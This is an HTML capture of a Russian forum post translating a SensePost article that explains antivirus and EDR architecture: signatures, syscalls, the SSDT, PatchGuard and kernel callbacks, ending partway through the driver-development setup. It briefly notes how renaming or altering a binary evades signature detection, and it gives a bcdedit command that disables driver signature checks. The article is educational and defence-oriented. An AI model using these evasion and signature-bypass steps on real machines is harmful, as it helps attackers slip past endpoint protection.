+               margin:0 0 10px 0;">
+      📡 Наши контакты
+    </h3>
+
+    <div class="block-body" style="line-height:1.4;">
+
+      <!-- Email -->
+      <p style="margin:8px 0;">
+        ✉️ Email:
+        <a href="../../cdn-cgi/l/email-protection.html#b8d1d6ded7f8d7cbd1d6cc8c8a96dbd7d5" style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          <span class="__cf_email__" data-cfemail="751c1b131a351a061c1b0141475b161a18">[email&#160;protected]</span>
+        </a>
+      </p>
+
+      <!-- TOR Mirror -->
+      <p style="margin:8px 0;">
+        🧅 TOR зеркало:
+        <a href="http://oiiph5yud65awuv7vyzknbihyuumv5q2etcrgh6z4xmgnsul3chnigyd.onion/"
+           target="_blank"
+           rel="noopener noreferrer"
+           style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          oiiph5yud65awuv7vyzknbihyuumv5q2etcrgh6z4xmgnsul3chnigyd.onion
+        </a>
+      </p>
+
+      <!-- Donate -->
+      <p style="margin:8px 0;">
+        💰 Donate (BTC):
+        <a href="bitcoin:bc1qm3mmvdp05d0q0y4ea3tw8rvrn2e0cpcmmmwxgz"
+           style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          bc1qm3mmvdp05d0q0y4ea3tw8rvrn2e0cpcmmmwxgz
+        </a>
+      </p>
+
+      <!-- Notice -->
+      <p style="margin:15px 0 0;
+                padding:10px;
+                border-radius:6px;
+                background:#ffeaea;
+                color:#c0392b;
+                font-weight:bold;
+                text-align:center;">
+        ⚠️ Это архив форума, в ближайшее время поддержка ресурса не планируется!
+      </p>
+
+    </div>
+  </div>
+</div>
+		</div>
+	</li>
+
+			
+		</ul>
+	
+
+			
+
+			
+
+			
+			
+	
+		<ul class="p-breadcrumbs "
+			itemscope itemtype="https://schema.org/BreadcrumbList">
+			
+				
+
+				
+				
+
+				
+
+				
+				
+					
+					
+	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+		<a href="../categories/issledovaniye-zashchity-operatsionnykh-sistem.8/index.html" itemprop="item">
+			<span itemprop="name">Исследование защиты операционных систем</span>
+		</a>
+		<meta itemprop="position" content="1" />
+	</li>
+
+				
+			
+		</ul>
+	
+
+			
+
+			
+	<noscript class="js-jsWarning"><div class="blockMessage blockMessage--important blockMessage--iconic u-noJsOnly">JavaScript отключён. Для полноценно использования нашего сайта, пожалуйста, включите JavaScript в своём браузере.</div></noscript>
+
+			
+	<div class="blockMessage blockMessage--important blockMessage--iconic js-browserWarning" style="display: none">Вы используете устаревший браузер. Этот и другие сайты могут отображаться в нем неправильно.<br />Необходимо обновить браузер или попробовать использовать <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">другой</a>.</div>
+
+
+			
+				<div class="p-body-header">
+					
+		<div class="contentRow contentRow--hideFigureNarrow">
+			<div class="contentRow-main">
+				<div class="p-title">
+					<h1 class="p-title-value">
+						
+							
+							Архитектура антивирусов и EDR - систем
+						
+					</h1>
+				</div>
+				
+					<div class="p-description">
+						
+							<ul class="listInline listInline--bullet">
+								<li>
+									<i class="fa--xf far fa-user "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Автор</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#user"></use></svg></i>
+									<span class="u-srOnly">Автор</span>
+									
+										<a href="https://osint42.org/members/0x42.1/" class="username  u-concealed" dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a>
+									
+								</li>
+								
+								<li>
+									<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Дата публикации</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
+									<span class="u-srOnly">Дата публикации</span>
+
+									<a href="index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-22T19:52:56+0300" data-timestamp="1750611176" data-date="22.06.2025" data-time="19:52" data-short="22 Июн" title="22.06.2025 в 19:52">22.06.2025</time></a>
+								</li>
+								
+																
+									<li>
+										<i class="fa--xf far fa-hourglass "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Article read time</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#hourglass"></use></svg></i>
+										<span class="u-srOnly">Article read time</span>
+
+										30 min read
+									</li>
+								
+								
+								
+							</ul>
+						
+					</div>
+				
+
+				
+
+	
+		
+	
+
+			</div>
+		</div>
+	
+				</div>
+				
+
+			<div class="p-body-main p-body-main--withSidebar ">
+				
+				<div class="p-body-contentCol"></div>
+				
+					<div class="p-body-sidebarCol"></div>
+				
+
+				
+
+				<div class="p-body-content">
+					
+					<div class="p-body-pageContent">
+
+
+
+
+
+
+
+
+
+	
+
+	
+
+
+
+	
+	
+
+	
+
+
+
+
+	
+
+
+
+
+	
+
+
+
+
+
+
+
+	
+
+
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+
+
+
+
+
+
+
+	
+		
+		
+
+		
+			<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script class="js-extraPhrases" type="application/json">
+			{
+				"lightbox_close": "Закрыть",
+				"lightbox_next": "Следующая",
+				"lightbox_previous": "Предыдущая",
+				"lightbox_error": "Запрошенный контент не может быть загружен. Пожалуйста, попробуйте позже.",
+				"lightbox_start_slideshow": "Запустить слайд-шоу",
+				"lightbox_stop_slideshow": "Остановить слайд-шоу",
+				"lightbox_full_screen": "Полный экран",
+				"lightbox_thumbnails": "Миниатюры",
+				"lightbox_download": "Скачать",
+				"lightbox_share": "Поделиться",
+				"lightbox_zoom": "Увеличить",
+				"lightbox_new_window": "Новое окно",
+				"lightbox_toggle_sidebar": "Переключить боковую панель"
+			}
+			</script>
+		
+		
+	
+
+
+<div class="block">
+	
+
+	
+	
+		
+	
+	
+	
+	<div class="block-container">
+		<div class="block-body lbContainer js-articleBody"
+			data-xf-init="lightbox"
+			data-lb-id="article-48"
+			data-lb-caption-desc="0x42 &middot; 22.06.2025 в 19:52"
+			id="js-articleBody-48">
+
+			<div class="articleBody">
+				<article class="articleBody-main js-lbContainer">
+					
+					
+					
+					
+						
+
+	
+		
+	
+
+					
+
+					
+						
+
+						<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1750610652237.png"
+		data-src="https://osint42.org/attachments/1750610652237-png.669/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610652237-png.669/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610652237.png"
+			title="1750610652237.png"
+			width="512" height="512" loading="lazy" />
+	</div><br />
+<br />
+Перевод статьи:<a href="https://sensepost.com/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/" target="_blank" class="link link--external" rel="noopener">SensePost | Sensecon 23: from windows drivers to an almost fully working edr</a><br />
+<br />
+<b>Кратко:</b> Я хотел лучше понять EDR (Endpoint Detection and Response), поэтому создал <a href="https://github.com/sensepost/mydumbedr" target="_blank" class="link link--external" rel="noopener">фиктивное EDR</a> <b>(dummy EDR)</b> и расскажу об этом здесь.<br />
+<br />
+<b>EDR (Endpoint Detection and Response)</b> - это вид продукта безопасности, который направлен на обнаружение аномальной активности на компьютере или сервере.<br />
+Ища ресурсы по работе EDR, я понял, что даже если существует много литературы о EDR, нет многих статей, объясняющих архитектуру EDR и как оркестрируются различные компоненты EDR. Эта статья призвана развенчать мифы о том, как работают EDR, создавая настраиваемый вариант, внедряющий несколько техник, используемых в реальных EDR.<br />
+<br />
+<b>Глава 1. История вирусов</b><br />
+<br />
+Сначала мы рассмотрим историю антивирусов, узнаем, как они работали и почему они зависели от ядра операционной системы, затем мы узнаем, как создать настраиваемый драйвер ядра и, наконец, как превратить его в почти полностью функционирующий EDR.<br />
+<br />
+Если мы посмотрим на хронологию компьютерных вирусов и червей, мы узнаем, что термин &quot;червь&quot; был впервые использован Джоном фон Нейманом в статье под названием &quot;Теория самовоспроизводящихся автоматов&quot;, опубликованной в 1966 году. В этой статье Нейман показал, что в теории программу можно разработать так, чтобы она могла воспроизводить саму себя. За эту работу Нейман считался теоретическим &quot;отцом&quot; компьютерной вирусологии.<br />
+<br />
+Первый в истории работающий вирус назывался &quot;Creeper&quot; и был создан Бобом Томасом. Это был первый известный червь, так как он мог воспроизводить себя через сеть (ARPANET), копируясь на удаленные системы. Несмотря на то, что это был первый обнаруженный вирус, его действия были доброжелательными, поскольку он лишь печатал сообщение &quot;I’M THE CREEPER. CATCH ME IF YOU CAN&quot; (&quot;Я - Creeper. Поймай меня, если сможешь&quot;):<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610685123.png"
+		data-src="https://osint42.org/attachments/1750610685123-png.670/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610685123-png.670/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610685123.png"
+			title="1750610685123.png"
+			width="1006" height="228" loading="lazy" />
+	</div><br />
+<br />
+Знание того, что такие программы могут быть созданы, умные люди начали работать над средствами безопасности, способными их удалять. Например, &quot;Reaper&quot;, единственная цель которого состояла в удалении Creeper с зараженных хостов, передвигаясь по сети ARPANET. Технически &quot;Reaper&quot; сам был червем, но хорошим... Это было первым антивирусным программным обеспечением, но в конце 1980-х годов появилось еще много других, и все они стремились к одной цели: защите компьютеров от вредоносных программ.<br />
+<br />
+<b>Раздел 2. Как антивирусные программы защищали компьютеры?</b><br />
+<br />
+В 90-х годах антивирусные продукты могли обнаруживать вирусы двумя способами:<br />
+<ol>
+<li data-xf-list-type="ol">С помощью простых эвристических правил:<ul>
+<li data-xf-list-type="ul">Какое имя у бинарного файла?</li>
+<li data-xf-list-type="ul">Что находится в метаданных (строки, комментарии...)</li>
+</ul></li>
+<li data-xf-list-type="ol">С помощью сигнатур, которые вычислялись для каждого бинарного файла:</li>
+</ol><div class="bbImageWrapper  js-lbImage" title="1750610702277.png"
+		data-src="https://osint42.org/attachments/1750610702277-png.671/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610702277-png.671/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610702277.png"
+			title="1750610702277.png"
+			width="397" height="164" loading="lazy" />
+	</div><br />
+<br />
+При сохранении двоичного файла на диске антивирус проверял, была ли его сигнатура известна и классифицирована как вредоносная. В случае положительного совпадения, двоичный файл помещался в карантин или удалялся.<br />
+По очевидным причинам этого было недостаточно, потому что все эти методы обнаружения основаны на информации, которую злоумышленник может манипулировать. Если вы блокируете двоичные файлы с именем mimikatz.exe, я просто переименую его в notmimikatz.exe. Если вы блокируете двоичные файлы, содержащие определенную строку, я ее удалю! Если вы выставляете флаг сигнатуры двоичного файла, я просто изменю один байт в двоичном файле, и мы готовы к работе. Статический анализ был недостаточным.<br />
+Для более сложного обнаружения вирусов необходимо было иметь возможность анализа системы динамически и, в частности, следить за:<br />
+<ul>
+<li data-xf-list-type="ul">Созданием процессов</li>
+<li data-xf-list-type="ul">Загрузкой библиотек</li>
+<li data-xf-list-type="ul">Изменением файлов</li>
+<li data-xf-list-type="ul">Вызовом функций, а также параметрами, которые они принимают</li>
+</ul>Если мы рассмотрим архитектуру операционных систем, мы увидим, что они основаны на двух пространствах:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610717993.png"
+		data-src="https://osint42.org/attachments/1750610717993-png.672/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610717993-png.672/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610717993.png"
+			title="1750610717993.png"
+			width="629" height="339" loading="lazy" />
+	</div><br />
+<br />
+Пространство пользователя - это место, где работают ваши процессы, где вы редактируете файл Word, где звоните своим друзьям через Discord. Каждый процесс, работающий в пространстве пользователя, имеет свою собственную среду выполнения, что означает, что если Discord завершит работу, Word все равно будет работать. С другой стороны находится ядерное пространство, где работает ядро операционной системы, а также службы и драйверы. Поскольку в ядерном пространстве выполняется само ядро, здесь содержится много интересной информации, хранящейся в структурах, полезной для проверки. Однако, как вы, возможно, догадались, невозможно для программы в пространстве пользователя напрямую получить доступ к этой информации, поскольку пространство пользователя и ядерное пространство изолированы друг от друга:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610733092.png"
+		data-src="https://osint42.org/attachments/1750610733092-png.673/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610733092-png.673/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610733092.png"
+			title="1750610733092.png"
+			width="630" height="235" loading="lazy" />
+	</div><br />
+<br />
+Единственным способом получить доступ к этим конкретным структурам напрямую является выполнение кода непосредственно в самом ядерном пространстве, и самым простым способом сделать это - через драйвер ядра.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610747167.png"
+		data-src="https://osint42.org/attachments/1750610747167-png.674/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610747167-png.674/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610747167.png"
+			title="1750610747167.png"
+			width="625" height="328" loading="lazy" />
+	</div><br />
+<br />
+Одной из наиболее часто целевых структур была SSDT (таблица диспетчеризации системных служб). Чтобы понять, почему, мы должны рассмотреть, что делает операционная система, когда вы пытаетесь открыть файл. Для пользователя открытие файла - это ничего особенного, вы просто дважды щелкаете по файлу, и программа (скажем, блокнот или Word) откроет файл для вас. Однако для выполнения такой задачи операционная система должна пройти через несколько этапов, которые описаны на следующей схеме:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610760133.png"
+		data-src="https://osint42.org/attachments/1750610760133-png.675/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610760133-png.675/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610760133.png"
+			title="1750610760133.png"
+			width="621" height="771" loading="lazy" />
+	</div><br />
+<br />
+Как видно, пользовательские приложения в большинстве своем зависят от WinAPI, который состоит из набора функций, удобных для разработчиков, документированных Microsoft и предоставляемых несколькими DLL, такими как kernel32.dll, user.dll или advapi.dll. Поэтому первым шагом для открытия файла является использование функции CreateFileA, предоставляемой kernel32.dll, прототип которой следующий:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE CreateFileA(
+    LPCSTR                lpFileName,
+    DWORD                 dwDesiredAccess,
+    DWORD                 dwShareMode,
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+    DWORD                 dwCreationDisposition,
+    DWORD                 dwFlagsAndAttributes,
+    HANDLE                hTemplateFile
+);</code></pre>
+	</div>
+</div><br />
+Его использование полностью документировано, и функцию довольно легко использовать. Все, что вам нужно сделать, - это указать путь к файлу, который вы хотите открыть, а также желаемый доступ к нему (чтение, запись или добавление). Рассмотрим ход выполнения функции CreateFileA, и мы увидим, что в конечном итоге она вызовет другую функцию, NtCreateFile, предоставляемую NTDLL.dll, прототип которой следующий:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>__kernel_entry NTSTATUS NtCreateFile(
+    PHANDLE            FileHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK   IoStatusBlock,
+    PLARGE_INTEGER     AllocationSize,
+    ULONG              FileAttributes,
+    ULONG              ShareAccess,
+    ULONG              CreateDisposition,
+    ULONG              CreateOptions,
+    PVOID              EaBuffer,
+    ULONG              EaLength
+);</code></pre>
+	</div>
+</div><br />
+Как видите, прототип функции NtCreateFile намного сложнее, чем у функции CreateFileA. Причина в том, что NTDLL.dll на самом деле является пользовательским отражением функций, предоставляемых самим ядром. В связи с этим NTDLL.dll добавляет несколько дополнительных параметров, необходимых ядру для выполнения задачи по открытию файла, которыми не управляет разработчик.<br />
+После установки всех этих параметров программа должна запросить ядро на открытие файла. Это означает, что программа должна вызвать функцию NtCreateFile, предоставленную самим ядром. В начале этой статьи я упомянул, что процесс в пространстве пользователя не может напрямую обращаться к ядровому пространству, и это правда! Однако они могут запросить ядро выполнить конкретные задачи. Для запроса такого действия вам нужно вызвать специфический механизм, называемый системным вызовом.<br />
+<br />
+Рассматривая разбор функции NtCreateFile из NTDLL.dll, мы видим следующее:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610807052.png"
+		data-src="https://osint42.org/attachments/1750610807052-png.676/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610807052-png.676/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610807052.png"
+			title="1750610807052.png"
+			width="655" height="168" loading="lazy" />
+	</div><br />
+<br />
+Два момента являются важными. Первый - это вторая строка:<br />
+mov eax, 55h<br />
+<br />
+Эта строка перемещает значение 55 в регистр EAX. Это значение, 55, называется номером системного вызова. Каждая функция из NTDLL.dll связана с определенным номером системного вызова, который изменяется в разных версиях операционной системы Windows. Вторая важная строка - это сама инструкция syscall:<br />
+syscall<br />
+<br />
+Эта инструкция говорит процессору переключиться из пространства пользователя в пространство ядра, а затем перейти по адресу ядра, где находится функция NtCreateFile. Проблема в том, что процессор не знает, где находится функция NtCreateFile. Для поиска адреса функции ему потребуются как номер системного вызова, хранящийся в регистре EAX, так и SSDT. Почему SSDT? Потому что эта структура представляет собой индекс, содержащий список номеров системных вызовов и местоположение соответствующего шестнадцатеричного адреса функции в ядре.<br />
+<br />
+Итак, когда процессор вызывает syscall, он ищет в этой структуре номер системного вызова 55 и переходит на адрес, связанный с этим номером системного вызова. Следующая схема подводит итог всему процессу открытия файла в операционной системе Windows:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610821113.png"
+		data-src="https://osint42.org/attachments/1750610821113-png.677/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610821113-png.677/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610821113.png"
+			title="1750610821113.png"
+			width="567" height="478" loading="lazy" />
+	</div><br />
+<br />
+Когда ядро получает запрос, оно запросит драйвер (например, драйвер жесткого диска) на чтение содержимого файла, хранящегося на жестком диске, что, в конечном итоге, позволит блокноту вывести его содержимое на экран.<br />
+<br />
+Взглянув на SSDT, становится ясно, что при изменении адресов функций ядра можно практически перенаправить поток кода в любое место, которое вам нужно. По этой причине авторы средств безопасности начали вносить патчи в SSDT, чтобы перенаправлять вызовы к своим собственным драйверам, чтобы они могли анализировать, какие функции вызываются, вместе с их аргументами:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610833428.png"
+		data-src="https://osint42.org/attachments/1750610833428-png.678/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610833428-png.678/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610833428.png"
+			title="1750610833428.png"
+			width="569" height="510" loading="lazy" />
+	</div><br />
+<br />
+Таким образом, используя свои собственные драйверы, защитники могли анализировать системные вызовы и определять, являются ли они законными или вредоносными.<br />
+<br />
+Структура SSDT проста, что делает ее относительно безопасной для манипуляций. Однако модификация других более сложных структур ядра может быть опасной задачей. В пространстве ядра, если код, который вы выполняете, содержит ошибку, это может вызвать аварийное завершение работы всего ядра. Более того, если код содержит ошибку логики или уязвимость, связанную с памятью (например, переполнение стека), злоумышленник может использовать их, чтобы выполнить код непосредственно в пространстве ядра (как наиболее привилегированный пользователь в системе). Наконец, если защитники могут использовать ядерные драйверы для доступа к ядру и изменения его поведения, то атакующие также могут использовать rootkit&#039;ы.<br />
+Для защиты операционной системы как от навязчивых модификаций, внесенных антивирусами, так и от атакующих, Microsoft создала KPP (Kernel Patch Protection), более известную как PatchGuard, и выпустила ее вместе с Windows XP/2003.<br />
+<br />
+PatchGuard - это активный механизм безопасности, который периодически проверяет состояние нескольких критически важных структур ядра Windows. Если одна из этих структур будет изменена чем-либо, кроме законного ядерного кода, то PatchGuard вызывает фатальную системную ошибку (известную как &quot;баг-чек&quot;), что приводит к перезагрузке компьютера:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610847425.png"
+		data-src="https://osint42.org/attachments/1750610847425-png.679/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610847425-png.679/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610847425.png"
+			title="1750610847425.png"
+			width="577" height="380" loading="lazy" />
+	</div><br />
+<br />
+В результате PatchGuard предотвращал изменение критических структур ядра со стороны других компонентов, включая само ядро. С выпуском PatchGuard стало невозможным для антивируса перехватывать SSDT или любые критические структуры в ядре:<br />
+<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610858869.png"
+		data-src="https://osint42.org/attachments/1750610858869-png.680/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610858869-png.680/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610858869.png"
+			title="1750610858869.png"
+			width="439" height="487" loading="lazy" />
+	</div><br />
+<br />
+Очевидно, создатели средств безопасности были в ярости, так как это практически отключило большую часть их инструментов, и некоторые из них даже попытались подать в суд на Microsoft.<br />
+<br />
+Для решения этой проблемы и возможности снова мониторинга системы с помощью средств безопасности Microsoft добавила новые функции в свою операционную систему, которые зависят от нового механизма, называемого объектом обратного вызова. Ниже приведено определение объекта обратного вызова, предоставленное Microsoft:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610870408.png"
+		data-src="https://osint42.org/attachments/1750610870408-png.681/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610870408-png.681/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610870408.png"
+			title="1750610870408.png"
+			width="863" height="199" loading="lazy" />
+	</div><br />
+<br />
+Эти функции, в основном, позволяют ядерному драйверу получать уведомления от ядра каждый раз, когда обрабатывается определенное действие. Таким образом, это позволяет программному обеспечению (например, EDR) динамически отслеживать, что происходит в системе.<br />
+<br />
+Этот механизм - первый, который мы собираемся реализовать в нашем EDR, но прежде чем мы перейдем к этому, нам потребуется ядерный драйвер, и, следовательно, нам нужно лучше понять, что такое драйвер и как его можно разрабатывать.<br />
+<br />
+<b>Раздел III. Что такое драйвер?</b><br />
+<br />
+Драйвер определяется как компонент, который предоставляет программный интерфейс для аппаратного устройства. Типичным примером драйвера может быть драйвер клавиатуры, который преобразует электрический сигнал, полученный от ваших клавиш клавиатуры, в символ, который будет выведен на вашем экране:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610884540.png"
+		data-src="https://osint42.org/attachments/1750610884540-png.682/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610884540-png.682/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610884540.png"
+			title="1750610884540.png"
+			width="1024" height="254" loading="lazy" />
+	</div><br />
+<br />
+Существует множество различных драйверов, используемых в системе, например, драйвер Bluetooth, драйвер клавиатуры, драйвер мыши и даже драйвер ввода/вывода сети, который отвечает за преобразование электрических сигналов в сетевые пакеты, которые может понять система.<br />
+Если вы хотите посмотреть на драйверы, работающие в вашей системе, вы можете использовать инструмент <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/winobj" target="_blank" class="link link--external" rel="noopener">WinObj.exe из набора SysInternals</a>:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610895957.png"
+		data-src="https://osint42.org/attachments/1750610895957-png.683/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610895957-png.683/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610895957.png"
+			title="1750610895957.png"
+			width="603" height="545" loading="lazy" />
+	</div><br />
+<br />
+Microsoft предоставляет множество образцов драйверов <a href="https://github.com/microsoft/Windows-driver-samples" target="_blank" class="link link--external" rel="noopener">на своем репозитории на Github</a>, если вы хотите посмотреть, как выглядит код драйвера. Вы скоро поймете, что разработка драйвера довольно сложна. Как упоминалось ранее, даже малейшая ошибка в управлении памятью может вызвать сбой драйвера и, следовательно, ядра. Именно поэтому Microsoft предоставляет несколько фреймворков, которые упрощают разработку ядерных драйверов.<br />
+Основным фреймворком является WDF (Windows Driver Framework), который состоит из двух различных подфреймворков:<br />
+<ul>
+<li data-xf-list-type="ul">KMDF (Kernel-Mode Driver Framework)</li>
+<li data-xf-list-type="ul">UMDF (User-Mode Driver Framework)</li>
+</ul>Оба этих фреймворка имеют свои плюсы и минусы.<br />
+<br />
+Прежде всего нам потребуется установить Visual Studio, SDK и Windows Driver Kit. К сожалению, это немного сложный процесс, который зависит от версии Windows, которую вы используете.<br />
+<br />
+На момент написания этой статьи, для Windows 10 <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk" target="_blank" class="link link--external" rel="noopener">вы можете следовать этой процедуре</a>, чтобы установить каждый необходимый компонент. Обратите внимание, что даже если упоминается Windows 11, это также работает для Windows 10. Затем нам нужно будет установить дополнительную библиотеку Spectre с помощью установщика Visual Studio:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610911108.png"
+		data-src="https://osint42.org/attachments/1750610911108-png.684/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610911108-png.684/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610911108.png"
+			title="1750610911108.png"
+			width="687" height="462" loading="lazy" />
+	</div><br />
+<br />
+Либо, если вам не важны меры по снижению уязвимости Spectre (что, вероятно, не имеет значения для этого теста) или у вас возникли проблемы с правильными версиями в Visual Studio, вы можете отключить его в свойствах проекта.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610923691.png"
+		data-src="https://osint42.org/attachments/1750610923691-png.685/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610923691-png.685/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610923691.png"
+			title="1750610923691.png"
+			width="880" height="425" loading="lazy" />
+	</div><br />
+<br />
+Затем, чтобы подготовиться к загрузке нашего собственного драйвера, мы отключим проверку подписи драйверов операционной системы. В командной строке с повышенными правами выполните следующую команду:<br />
+bcdedit /set testsigning on bcdedit -debug on<br />
+<br />
+Причина, по которой мы должны это сделать, заключается в том, что начиная с версии Windows 10 1507, невозможно загрузить драйверы, не подписанные Microsoft, чтобы предотвратить возможность установки rootkit. Эти команды просто отключают проверку подписи и включают режим отладки, что позволит нам загрузить наш драйвер и отлаживать его с помощью WinDbg. Наконец, нам нужно будет включить вывод сообщений ядра в отладчик. Для этого нам нужно добавить следующий ключ:<br />
+<br />
+HKLM\SYSTEM\CurrentControlSet\Control\Session Manage\Debug Print Filter<br />
+Со значением 0xf:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610951064.png"
+		data-src="https://osint42.org/attachments/1750610951064-png.686/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610951064-png.686/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610951064.png"
+			title="1750610951064.png"
+			width="696" height="519" loading="lazy" />
+	</div><br />
+<br />
+Теперь перезагрузите компьютер. Откройте Visual Studio и создайте новый проект &quot;Драйвер режима ядра, Пустой&quot;:<br />
+<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610963578.png"
+		data-src="https://osint42.org/attachments/1750610963578-png.687/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610963578-png.687/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610963578.png"
+			title="1750610963578.png"
+			width="692" height="534" loading="lazy" />
+	</div><br />
+<br />
+После создания проекта у вас должна быть следующая структура проекта:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610976318.png"
+		data-src="https://osint42.org/attachments/1750610976318-png.688/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
